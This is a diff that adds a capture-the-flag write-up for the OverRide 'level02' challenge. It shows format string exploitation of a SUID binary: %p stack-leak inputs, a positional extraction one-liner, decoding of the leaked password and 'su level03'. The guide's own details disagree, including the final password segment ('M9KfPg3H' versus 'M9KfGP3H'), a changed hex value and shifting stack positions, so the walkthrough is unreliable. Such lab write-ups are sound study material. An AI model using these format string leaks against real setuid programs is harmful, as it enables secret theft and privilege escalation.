@@ -1,1 +1,197 @@
-hello flag
+# Level02 — Format String Information Disclosure
+
+## Context
+
+Inside the home directory of the `level02` user, we find a binary named `level02`.
+The program implements a secure access system that reads credentials from a file and compares them with user input.
+Our objective is to exploit a format string vulnerability to extract the password from memory and gain access to the next level.
+
+---
+
+## Initial Environment — Directory Listing
+
+```bash
+$ ls -la
+total 17
+dr-xr-x---+ 1 level03 level03   80 Oct  2  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level03 level03  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level03 users   7436 Sep 10  2016 level02
+-rw-r--r--  1 level03 level03  675 Sep 10  2016 .profile
+```
+
+> **Note:** the binary `level02` has the **SUID** bit set (`rws`), so it runs with the privileges of its owner (`level03`).
+
+---
+
+## Running the Binary
+
+```bash
+$ ./level02
+===== [ Secure Access System v1.0 ] =====
+
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+
+--[ Username: admin
+--[ Password: password
+
+*****************************************
+admin does not have access!
+```
+
+The program requests username and password, then validates the credentials.
+
+---
+
+## Static Analysis (Disassembly)
+
+**Key program flow analysis:**
+
+1. **File Operations:**
+   ```asm
+   0x400898 <+132>:    mov    $0x400bb0,%edx    ; "r"
+   0x40089d <+137>:    mov    $0x400bb2,%eax    ; "/home/users/level03/.pass"
+   0x4008a8 <+148>:    callq  0x400700 <fopen@plt>
+   ```
+
+2. **Password File Reading:**
+   ```asm
+   0x4008f4 <+224>:    mov    $0x29,%edx        ; Read 41 bytes
+   0x4008f9 <+229>:    mov    $0x1,%esi
+   0x400901 <+237>:    callq  0x400690 <fread@plt>
+   ```
+
+3. **User Input Collection:**
+   ```asm
+   0x4009d6 <+450>:    mov    %rax,%rdi         ; Username input
+   0x4009d9 <+453>:    callq  0x4006f0 <fgets@plt>
+   
+   0x400a1c <+520>:    mov    %rax,%rdi         ; Password input  
+   0x400a1f <+523>:    callq  0x4006f0 <fgets@plt>
+   ```
+
+4. **Authentication Logic:**
+   ```asm
+   0x400a63 <+591>:    callq  0x400670 <strncmp@plt>  ; Compare passwords
+   0x400a68 <+596>:    test   %eax,%eax
+   0x400a6a <+598>:    jne    0x400a96 <main+642>     ; Jump if not equal
+   ```
+
+**Critical observations:**
+* Program reads `/home/users/level03/.pass` into a local buffer
+* Username is processed with a vulnerable `printf` call
+* Password comparison uses `strncmp` with 41-byte length
+
+---
+
+## Vulnerability Analysis
+
+### Format String Vulnerability Discovery
+
+Testing the username input reveals a format string vulnerability:
+
+```bash
+$ ./level02
+--[ Username: %p %p %p %p
+--[ Password: test
+
+0x7fffffffe500 (nil) 0x74 0x2a2a2a2a2a2a2a2a does not have access!
+```
+
+**Key findings:**
+* Username input is passed directly to `printf` without format string protection
+* Stack memory contents are leaked through format specifiers
+* The password from the file is stored somewhere in the stack memory
+
+---
+
+## Memory Layout Analysis
+
+### Stack Memory Exploration
+
+Using multiple format specifiers to explore the stack:
+
+```bash
+$ python -c 'print "%p " * 40' | ./level02
+```
+
+**Output analysis:**
+```
+0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 
+0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070 (nil) (nil) 
+(nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 
+0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
+```
+
+**Password Location Identified:**
+* Positions 22-26 contain hex values that represent the password
+* Values: `0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d`
+
+---
+
+## Password Extraction Process
+
+### Step 1: Hex to ASCII Conversion
+
+Each 8-byte hex value needs to be converted to ASCII, accounting for little-endian byte ordering:
+
+**Hex Values:**
+```
+0x756e505234376848 → 0x4868373452506e75
+0x45414a3561733951 → 0x51397361654a4145  
+0x377a7143574e6758 → 0x58674e5743717a37
+0x354a35686e475873 → 0x7358476e68654a35
+0x48336750664b394d → 0x4d394b6650673348
+```
+
+### Step 2: ASCII Decoding
+
+Converting the corrected hex values to ASCII:
+```
+0x4868373452506e75 → "Hh74RPnu"
+0x51397361654a4145 → "Q9sa5JAE" 
+0x58674e5743717a37 → "XgNWCqz7"
+0x7358476e68654a35 → "sXGnh5J5"
+0x4d394b6647503348 → "M9KfPg3H"
+```
+
+**Extracted Password:** `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
+
+---
+
+## Exploitation
+
+### Method 1: Direct Format String Attack
+
+```bash
+$ python -c 'print "%p " * 26' | ./level02
+===== [ Secure Access System v1.0 ] =====
+# Password visible in positions 21-25 of the output
+```
+
+### Method 2: Targeted Format String Extraction
+
+```bash
+$ echo -e "%22\$p %23\$p %24\$p %25\$p %26\$p\ntest" | ./level02
+# Directly extract the 5 password segments
+```
+
+---
+
+## Privilege Escalation
+
+Using the extracted password to access the next level:
+
+```bash
+$ su level03
+Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfGP3H
+level03@OverRide:~$ 
+```
+
+**Result:** Successfully escalated to `level03` privileges!
+
+---
